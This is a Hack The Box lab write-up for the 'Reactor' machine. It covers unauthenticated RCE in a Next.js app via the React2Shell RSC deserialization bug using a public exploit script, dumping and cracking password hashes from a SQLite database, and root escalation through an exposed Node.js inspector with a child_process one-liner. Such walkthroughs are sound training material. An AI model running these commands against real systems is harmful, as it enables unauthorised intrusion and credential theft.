# Reactor — Hack The Box

**Difficulty:** —
**OS:** Linux
**Date:** 2026-08-15
**IP:** `10.129.105.11`

## Summary

The machine exposes a Next.js application ("ReactorWatch") on port 3000, vulnerable to **CVE-2025-55182 / CVE-2025-66478 ("React2Shell")**, an unauthenticated RCE in the React Server Components Flight protocol. From initial access as `node`, an exposed SQLite database revealed user password hashes; the `engineer` user's hash was cracked via rockyou. Privilege escalation to root was achieved through the Node.js debugger (`--inspect`) exposed on `127.0.0.1:9229`, tied to a monitoring process running with root privileges.

## Reconnaissance

```bash
nmap -sC -sV 10.129.105.11
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
3000/tcp open  http    Next.js (React 19.0.0)
```

## Enumeration

- Port 3000: static "ReactorWatch | Core Monitoring System" dashboard — no visible interaction.
- Analysis of the JS bundles (`/_next/static/chunks/*.js`) confirmed **React 19.0.0** and the use of React Server Components / Server Actions (headers `Next-Action`, `RSC`, `Next-Router-State-Tree`).
- `gobuster` and manual tests of common routes (`/admin`, `/api`, `/login`, etc.) revealed no additional endpoints — the app is largely client-side static.
- Next.js manifests (`app-build-manifest.json`, `build-manifest.json`) returned 404 — no visible hidden routes.
- The combination of the exact version (React 19.0.0) and confirmed use of RSC/Flight pointed to a known vulnerability class.

## Initial Access

**CVE-2025-55182 (React) / CVE-2025-66478 (Next.js) — "React2Shell"**: an insecure deserialization flaw in the React Server Components Flight protocol, enabling unauthenticated RCE via a specially crafted HTTP payload, even in default configurations.

Confirmed via a public PoC (`exploit.py`, variant with `-u`/`-c`/`--linux` flags):

```bash
python exploit.py -u http://10.129.105.11:3000 -c "whoami" --linux
```

```
OUTPUT:
node
```

RCE confirmed as user `node` (uid=999, gid=988).

## Post-Exploitation / Lateral Movement

Enumeration of the application directory (`/opt/reactor-app`) revealed a `reactor.db` file (SQLite):

```bash
python exploit.py -u http://10.129.105.11:3000 -c "sqlite3 reactor.db .dump" --linux
```

Extracted the `users` table:

```sql
INSERT INTO users VALUES(1,'admin','a203b22191d744a4e70ad##########','administrator','admin@reactor.htb');
INSERT INTO users VALUES(2,'engineer','39d97110eafe2a9a6863###########','operator','engineer@reactor.htb');
```

Cracked the MD5 hashes with hashcat:

```bash
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

Result: `engineer:########`

Successful SSH login:

```bash
ssh engineer@10.129.105.11
```

## Privilege Escalation

Process enumeration revealed a root-owned service running with the Node.js debugger active and exposed locally:

```
root  1125  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

The Node inspector allows arbitrary code execution in the process context (root):

```bash
node inspect 127.0.0.1:9229
```

Inside the debugger REPL:

```javascript
repl
process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()
```

Successful execution as root, confirming full privilege escalation.

## Flags

- User: `c0d1e6c23e28b9ffe9##############`
- Root: `cf7fe87eb3e229f42e##############`

## Lessons Learned

- Exact framework versions (here, React 19.0.0) are a direct indicator of known CVEs — always worth confirming the version via JS bundles/headers before spending time on route enumeration.
- System groups like `lxd` are an obvious escalation clue, but aren't always available (LXD wasn't installed here) — always worth reviewing root-owned processes (`ps aux`) for exposed debug ports or misconfigured services too.
- The Node.js Inspector (`--inspect`), even when only exposed on localhost, is a critical attack surface once combined with local access — it enables trivial RCE in the process's context.

## References

- [NVD — CVE-2025-55182](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)
- [Wiz Research — React2Shell](https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182)
- [TryHackMe — React2Shell room](https://tryhackme.com/room/react2shellcve202555182)
